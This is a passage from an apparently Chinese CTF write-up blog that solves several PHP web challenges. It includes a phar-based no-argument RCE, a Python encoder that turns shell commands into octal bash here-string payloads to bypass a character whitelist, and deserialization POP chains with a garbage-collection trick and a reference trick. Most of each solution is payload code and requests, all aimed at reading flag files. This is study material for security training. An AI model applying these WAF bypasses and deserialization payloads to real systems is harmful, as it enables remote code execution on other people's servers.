physical <span class="built_in">file</span> <span class="keyword">it</span>&#x27;s <span class="keyword">in</span>, an outer <span class="built_in">file</span> <span class="keyword">that</span> pulls <span class="keyword">it</span> <span class="keyword">in</span> will <span class="keyword">continue</span> <span class="keyword">to</span> execute.</span><br></pre></td></tr></table></figure><p>简单来说就是如果一个文件中包含了<code>__halt_compiler();</code>，并且该文件被 “include” 或 “require”，那么被调用的文件会被视为在 <code>__halt_compiler();</code>处截断。所以把这个函数放在无参数rce的后面就可以截断后面的字符串</p><p>先查看下目录，在原本<code>phar</code>文件上稍做修改即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$o</span>-&gt;<span class="attribute">cmd</span>=<span class="string">&#x27;print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));__halt_compiler();&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/05/66608921719bd.png" alt="image-20240408224749200.png"></p><p>看到这个flag文件的位置居中，不好读，那就只有随机读了，先把<code>phar</code>文件改了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$o</span>-&gt;<span class="attribute">cmd</span>=<span class="string">&#x27;show_source(array_rand(array_flip(scandir(current(localeconv())))));__halt_compiler();&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再POST传参</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phar:<span class="comment">///tmp/1007eff891b86c550c4a6a188f670a31.png/test.txt</span></span><br></pre></td></tr></table></figure><p>多执行几次就出了</p><h3 id="ezRCE（只用数字-、-、-、-rce）"><a href="#ezRCE（只用数字-、-、-、-rce）" class="headerlink" title="ezRCE（只用数字\、\\、$ 、&lt; rce）"></a>ezRCE（只用数字\、\\、$ 、&lt; rce）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure><p> 就是设了个白名单，只能用白名单中的字符串，ljl给了个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">n[<span class="number">8</span>] = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">n[<span class="number">9</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):                                <span class="comment">#命令转换成八进制字符串</span></span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]  <span class="comment">#ord转为ascll，然后oct转为8进制，然后从第三位开始截取</span></span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o                       <span class="comment">#数字加上/  为8进制形式</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):                                     <span class="comment">#八进制字符串转换成字符</span></span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span>                 <span class="comment">#开头固定格式，然后就\\来区分数字</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#弹shell</span></span><br><span class="line"><span class="built_in">print</span>(build(<span class="string">&#x27;执行的命令&#x27;</span>))</span><br></pre></td></tr></table></figure><p>若执行<code>cat /flag</code>，则脚本给出的代码为</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;<span class="symbol">\$</span>\&#x27;<span class="symbol">\\</span>154<span class="symbol">\\</span>163<span class="symbol">\\</span>40<span class="symbol">\\</span>57\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>解析：第一个<code>$0</code>：是一个特殊的变量，在 bash 中表示当前脚本的名称。<code>&lt;&lt;&lt;</code>：这是 bash 的 Here String 操作符，它用于将字符串作为输入传递给命令。在这里，它将字符串 <code>$0\&lt;\&lt;\&lt;\$\&#39;\\143\\141\\164\\40\\57\\146\\154\\141\\147&#39;</code> 传递给了当前命令。第二个 <code>$0</code> 是作为字符串中的普通字符出现，不是一个特殊变量，它作为普通字符被传递给当前命令。<code>\&lt;\&lt;\&lt;</code> 是一个 herestring 操作符，用于将后面的字符串作为输入。<code>\$\&#39;</code> 表示转义字符序列的开始。<code>\\143\\141\\164\\40\\57\\146\\154\\141\\147</code> 是一些转义字符序列，它们将被转换成 ASCII 字符串 “cat &#x2F;flag”。</p><p>简单来说这段代码就是将字符串 “cat &#x2F;flag” 作为输入传递给当前脚本并执行（tql😍以前从没见过）</p></blockquote><p>payload：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;<span class="symbol">\$</span>\&#x27;<span class="symbol">\\</span>143<span class="symbol">\\</span>141<span class="symbol">\\</span>164<span class="symbol">\\</span>40<span class="symbol">\\</span>57<span class="symbol">\\</span>146<span class="symbol">\\</span>154<span class="symbol">\\</span>141<span class="symbol">\\</span>147&#x27;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60</a></p><p><a href="https://xz.aliyun.com/t/8581?time__1311=n4+xuDgDBDyDRnzD/D0YoQ+wxAhu7WDfhGiD&alichlgref=https://xz.aliyun.com/t/8581#toc-3">https://xz.aliyun.com/t/8581?time__1311=n4%2BxuDgDBDyDRnzD%2FD0YoQ%2BwxAhu7WDfhGiD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8581#toc-3</a></p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EH+lYDkQo0Qk=4D&alichlgref=https://cn.bing.com/#toc-3">https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH%2BlYDkQo0Qk%3D4D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-3</a></p><h3 id="ezPOP（current函数、GC回收机制）"><a href="#ezPOP（current函数、GC回收机制）" class="headerlink" title="ezPOP（current函数、GC回收机制）"></a>ezPOP（current函数、GC回收机制）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>应该是在<code>call_user_func($a,$b)($c)($d)</code>处执行命令，<code>call_user_func($a,$b)($c)($d</code>的含义是先将a的值作为函数，b值作为参数进行执行，返回的结果再当作函数，并以c值为参数，再以返回值为函数，以d值为参数。</p><p><code>$b=$_POST;</code>说明b值是以POST方法提交的字段为键名，参数为键值的一个数组，而<code>unset($b[&#39;a&#39;]);</code>会去掉数组b中键名为a的值，说明数组b中至少两个键名，不然没法执行第一步了都，此时b为一个数组，所以我们需要a是一个能处理数组的函数，浩哥找到个current，官方文档：<a href="https://www.php.net/manual/zh/function.current.php">current - Manual - PHP</a>，current简单来说就是返回当前数组中第一个元素的值，所以POST传参如：a&#x3D;current&amp;b&#x3D;system，就会返回system函数，再对c赋值想要执行的命令即可rce，d赋空值即可</p><p>接下来就是构造链子，想要触发<code>__get()</code>，可以用<code>return $this-&gt;s-&gt;$p;</code>，触发<code>__toString()</code>，可以用<code>echo $this-&gt;c;</code>，故paylaod为：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=new CCC();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span>c=new AAA();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span><span class="function"><span class="title">c</span>-&gt;</span>s=new BBB();</span><br><span class="line">$<span class="function"><span class="title">a</span>-&gt;</span><span class="function"><span class="title">c</span>-&gt;</span><span class="function"><span class="title">s</span>-&gt;</span>c=<span class="string">&quot;cat /flag&quot;</span></span><br></pre></td></tr></table></figure><p>我们还需要绕过<code>throw new Exception(&quot;noooooob!!!&quot;);</code>，用GC回收机制绕过，推荐文章：<a href="https://xz.aliyun.com/t/11843?time__1311=mqmx0DBD9DyD2QKD/QbywnYGO7Qpq+D&alichlgref=https://www.bing.com/#toc-4">浅析PHP GC垃圾回收机制及常见利用方式</a> </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="type">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="keyword">new</span> <span class="type">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s=<span class="keyword">new</span> <span class="type">BBB</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s-&gt;c=<span class="string">&quot;cat /flag&quot;</span>；</span><br><span class="line"><span class="variable">$b</span>=array(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line">echo serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>得到序列化后的数据：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">2</span>:&#123;<span class="selector-tag">i</span>:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;<span class="selector-tag">i</span>:<span class="number">1</span>;<span class="selector-tag">i</span>:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>把<code>i:1;i:0;</code>改为<code>i:0;i:0;</code>，即可绕过抛出异常，故最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>：?xy=a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;N;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;&#125;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="attribute">POST</span>：a=current&amp;b=system</span><br></pre></td></tr></table></figure><h3 id="ezSerialize（SplFileObject读文件）"><a href="#ezSerialize（SplFileObject读文件）" class="headerlink" title="ezSerialize（SplFileObject读文件）"></a>ezSerialize（SplFileObject读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>要求<code>token</code>和<code>password</code>的值相同，赋地址就行，poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;token = &amp;<span class="variable">$a</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/fpclosefpclosefpcloseffflllaaaggg.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span 